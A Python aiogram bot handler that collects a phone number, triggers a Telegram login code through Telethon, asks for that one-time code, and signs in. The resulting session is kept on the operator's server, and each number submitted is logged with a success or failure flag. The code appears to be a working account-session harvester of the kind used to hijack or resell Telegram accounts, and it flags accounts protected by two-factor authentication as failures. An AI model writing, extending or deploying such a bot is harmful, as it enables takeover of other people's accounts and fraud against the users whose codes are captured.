
import os
from aiogram import Router, F
from aiogram.types import Message
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from telethon.sync import TelegramClient
from telethon.errors import SessionPasswordNeededError
from database import get_user, log_submission
from messages import MESSAGES

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

class OTPState(StatesGroup):
    waiting_for_number = State()
    waiting_for_code = State()

sessions = {}
router = Router()

@router.message(F.text == "/start")
async def cmd_start(msg: Message, state: FSMContext):
    lang = get_user(msg.from_user.id)[4]
    await msg.answer(MESSAGES[lang]["start"])
    await state.set_state(OTPState.waiting_for_number)

@router.message(OTPState.waiting_for_number)
async def receive_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    session_name = f"session_{msg.from_user.id}"
    client = TelegramClient(session_name, API_ID, API_HASH)
    await client.connect()
    sessions[msg.from_user.id] = client
    try:
        await client.send_code_request(number)
        await state.update_data(number=number)
        lang = get_user(msg.from_user.id)[4]
        await msg.answer(MESSAGES[lang]["otp_request"].format(number=number))
        await state.set_state(OTPState.waiting_for_code)
    except Exception as e:
        await msg.answer(f"❌ Failed: {str(e)}")
        await state.clear()

@router.message(OTPState.waiting_for_code)
async def receive_otp(msg: Message, state: FSMContext):
    data = await state.get_data()
    number = data["number"]
    code = msg.text.strip()
    client = sessions.get(msg.from_user.id)
    lang = get_user(msg.from_user.id)[4]
    try:
        await client.sign_in(phone=number, code=code)
        log_submission(msg.from_user.id, number, 1)
        await msg.answer(MESSAGES[lang]["success"])
    except SessionPasswordNeededError:
        log_submission(msg.from_user.id, number, 0)
        await msg.answer(MESSAGES[lang]["2fa"])
    except Exception as e:
        log_submission(msg.from_user.id, number, 0)
        await msg.answer(MESSAGES[lang]["fail"] + f"\n{e}")
    await state.clear()
